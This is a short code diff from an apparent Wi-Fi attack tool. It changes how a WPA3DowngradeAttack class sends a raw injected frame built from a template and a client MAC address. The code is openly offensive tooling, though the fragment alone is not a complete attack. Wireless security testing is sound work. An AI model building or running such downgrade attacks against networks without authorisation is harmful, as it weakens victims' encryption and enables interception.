@@ -213,7 +213,7 @@ class WPA3DowngradeAttack(Campaign):
         # Frame = FC+Dur (4B) + client_mac (6B) + rest_of_template (from byte 10)
         frame = self._template[:4] + client_mac + self._template[10:]
         try:
-            ok = await self.iface.send_raw(frame, use_no_ack=True)
+            ok = await self.iface.send_no_wait(frame)
         except Exception:
             logger.exception("[WPA3-Down] send_raw failed")
             ok = False
